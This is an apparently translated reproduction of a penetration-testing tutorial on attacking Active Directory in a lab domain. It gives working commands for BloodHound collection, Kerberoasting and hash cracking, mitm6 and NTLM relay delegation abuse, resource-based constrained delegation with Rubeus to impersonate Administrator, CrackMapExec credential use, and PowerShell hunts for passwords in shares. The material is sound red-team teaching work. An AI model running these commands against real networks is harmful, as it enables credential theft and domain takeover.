# Active Directory Penetration Testing: A Reproduction

**Original Article Link:** [Penetration Testing Active Directory, Part II â€“ root@Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)

This article primarily discusses how to perform information gathering and privilege escalation in a low-privilege environment. I will also attempt to explain the underlying principles clearly.

## BloodHound

### Installation and Usage
- **Installation on macOS**: Simply install BloodHound directly. However, downloading the database can be slow; consider using a global proxy.
- **Login and Remote Data Dumping**:
  - First, install [BloodHound.py](https://github.com/fox-it/BloodHound.py).
  - During installation, you might encounter an `ImportError: No module named cstruct`. This is often due to an outdated version of pip. Ensure you have the latest version installed.
  - After installation, use the following command to run BloodHound:
    ```bash
    python bloodhound.py -d pentestlab.com -u flowing -p xxx -gc win7.pentestlab.com -c all -v --dns-tcp
    ```
  - **DNS Resolution Issue**: If DNS resolution fails, you may need to set up a local Python environment on the target machine, which is not practical in real-world scenarios. Refer to the screenshots for more details.
  - **Visualization Tool**: [GoFetch](https://github.com/GoFetchAD/GoFetch) can be used to visualize the attack plan generated by BloodHound. Watch the [tutorial video](https://www.youtube.com/watch?v=5SpDAxUx7Uk&feature=youtu.be) for a detailed guide.

## Kerberoasting Attack

### Tool: GetUserSPNs.py
- **What is Kerberoasting?**
  - In a domain environment, services are associated with accounts using SPNs (Service Principal Names). When a user accesses a specific resource, they receive a Kerberos ticket signed with the NTLM hash of the service account.
  - By capturing this ticket, you can attempt to crack the NTLM hash offline.
- **Usage**:
  - Use [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) to request SPN tickets.
    ```bash
    proxychains4 python GetUserSPNs.py -request -dc-ip 10.0.0.2 pentestlab.com/flowing
    ```
  - Crack the captured hashes using `hashcat`:
    ```bash
    hashcat -m 13100 -a 0 kerberos.txt cracks.txt
    ```
  - With the plaintext password, you can attempt to log in to the Domain Controller (DC).

## AS-REP Roasting

### Tool: Rubeus
- **Similar to Kerberoasting**, AS-REP Roasting involves requesting a TGT and then cracking it. However, this attack requires that Kerberos pre-authentication is disabled.
- **Tool**: [Rubeus](https://github.com/GhostPack/Rubeus)
- **Compilation**:
  - Compilation can be challenging. You may need to use Visual Studio 2017.
  - Once compiled, you can use Rubeus to perform the attack.

## SILENTTRINITY

- **Description**: SILENTTRINITY is a tool developed using IronPython and C#.
- **Usage**:
  - Create a shared directory to store the malicious XML file.
  - Use `crackmapexec` (CME) to execute the XML file.
  - The `-exec-method atexec` option returns a system shell.
  - **Note**: This tool only supports .NET 4.5.
  - **Tutorial Video**: [SILENTTRINITY | Demonsec](http://www.ggsec.cn/SILENTTRINITY.html)

## Unconstrained Kerberos Delegation

- **msDS-AllowedToActOnBehalfOfOtherIdentity Attribute**: This attribute controls whether a user can impersonate any computer in the domain via Kerberos. This can be exploited using a relay attack.
- **Tool**: [mitm6](https://github.com/DirkjanO/mitm6)
- **Principle**:
  - mitm6 listens on the attacker's main interface and responds to DHCPv6 requests, assigning addresses to each computer, effectively acting as a DNS server.
  - Use [ntlmrelayx.py](https://github.com/CoreSecurity/impacket/blob/master/examples/ntlmrelayx.py) to relay the NTLM challenge/response data.
- **Commands**:
  - Start mitm6:
    ```bash
    mitm6 -i en0 -d pentestlab.com
    ```
  - Relay to DC using ntlmrelayx.py:
    ```bash
    python ntlmrelayx.py -t ldaps://pentestlab-Dc.pentestlab.com -wh 192.168.123.54 --delegate-access
    ```
  - Generate a Silver Ticket:
    ```bash
    getST.py -spn cifs/pentestlabwin7.pentestlab.com pentestlab.com/AFWMZ0DS\$ -dc-ip 10.10.0.2  -impersonate Administrator
    ```

## Resource-Based Constrained Delegation (RBCD) Attack

- **Principle**: This method is complex and may require a separate article to explain fully.
- **Precondition**: Requires a Windows Server 2012 DC.
- **Tools**:
  - [Powermad](https://github.com/Kevin-Robertson/Powermad)
  - [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
  - [Rubeus](https://github.com/GhostPack/Rubeus)
- **Setup**:
  - Set execution policy:
    ```powershell
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
    ```
  - Import necessary scripts.
  - Query DACL permissions:
    ```powershell
    $AttSID = Get-DomainGroup Users -Properties objectsid | Select -Expand objectsid
    Get-DomainObjectACL Pentestlabwin7.pentestlab.com | ?{$_.SecurityIdentifier -match $AttSID}
    ```
  - Create a new user and add its SID to the DC's `msDS-allowedToActOnBehalfOfOtherIdentity` attribute.
  - Use Rubeus to create an NT hash and simulate a DC admin:
    ```bash
    Rubeus.exe hash /user:hackerwing /password:wing2019  /domain:pentestlab.com
    Rubeus.exe s4u /user:hackerwing$ /rc4: 6D1BF3B1E6C721EA14C13A007E656FAA /impersonateuser:Administrator /msdsspn:cifs/pentestLab-DC.pentestlab.com /ptt
    ```

## MS14-025 and Group Policy Preferences (GPP)

- **Known Vulnerability**: This vulnerability is well-known.
- **Metasploit Module**: Check the SYSVOL directory for GPP passwords.

## Finding High-Privilege Users with CrackMapExec

- **Command**:
  ```bash
  cme smb 192.168.123.0/24 -u flowing -p Admin@1234 --shares
  ```
- **Usage**: Use this in conjunction with your C2 tool for lateral movement.

## PowerTools

- **Password Collection**:
  - Use `Invoke-FileFinder` to search for strings in files:
    ```powershell
    Invoke-FileFinder -Threads 100 -Verbose -Terms password
    ```
  - Newer version:
    ```powershell
    $Password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential("DOMAIN\user",$Password)
    Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
    ```

## PowerUp

- **Function**: `Invoke-AllChecks` to check for insecure configurations.

## Get-ExploitableSystem

- **Function**: Lists potential vulnerabilities and provides Metasploit module locations.

## GetSystem

- **Function**: Similar to Metasploit's `getsystem`.

## ADAPE

- **Tool**: Automatically generates reports.
- **Usage**: Run the tool, and it will generate a report in the current directory.

## References

- [SPN Service Principal Name Discovery](https://www.freebuf.com/articles/system/174229.html)
- [Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
- [Combining NTLM Relay and Kerberos Delegation Attacks](https://www.cnblogs.com/backlion/p/10524322.html)
- [A Case Study in Wagging the Dog: Computer Takeover](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)
- [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [Microsoft Exchange Vulnerability Analysis - CVE-2018-8581](https://www.cnblogs.com/iamstudy/articles/Microsoft_Exchange_CVE-2018-8581_2.html)
- [Kerberos Attack: Silver Ticket Edition](https://www.varonis.com/blog/kerberos-attack-silver-ticket/)